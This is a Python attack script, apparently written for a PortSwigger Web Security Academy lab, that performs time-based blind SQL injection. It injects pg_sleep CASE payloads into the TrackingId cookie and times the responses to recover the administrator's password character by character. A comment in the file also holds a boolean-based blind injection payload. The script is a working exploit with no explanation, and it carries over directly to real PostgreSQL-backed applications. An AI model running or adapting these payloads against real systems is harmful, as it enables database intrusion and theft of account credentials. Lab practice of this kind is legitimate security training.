import grequests
import requests
import string
# WARNING: should not use grequests to test time delay, not precise
session = requests.session()

burp0_url = "https://ac841f251f594c9ec0d414e000dd0031.web-security-academy.net:443/"
burp0_cookies = {"TrackingId": "HPzQdsDyPJ206ElO'%3BSELECT+CASE+WHEN+(SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--", "session": "VzE6udgrQBFlAHsD3mEChQ95374LE7RW"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://portswigger.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

chars = []
tasks = []
#blind sql injection +AND+(SELECT+SUBSTRING(password,2,1)+FROM+users+WHERE+username='administrator')='a
for i in range (1, 2):
	for j in string.ascii_lowercase + string.digits: #a to z plus 0 to 9
		chars.append((i,j))
		tasks.append(grequests.get('https://ac841f251f594c9ec0d414e000dd0031.web-security-academy.net', cookies={
				"TrackingId":f"HPzQdsDyPJ206ElO'%3BSELECT+CASE+WHEN+(SUBSTRING(password,{i},1)='{j}')+THEN+pg_sleep(10)ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--",
				"session":'VzE6udgrQBFlAHsD3mEChQ95374LE7RW'
			}))

responses=grequests.map(tasks)
for index,response in enumerate(responses):
	print('seconds', response.elapsed.total_seconds()) 
	print('char', chars[index])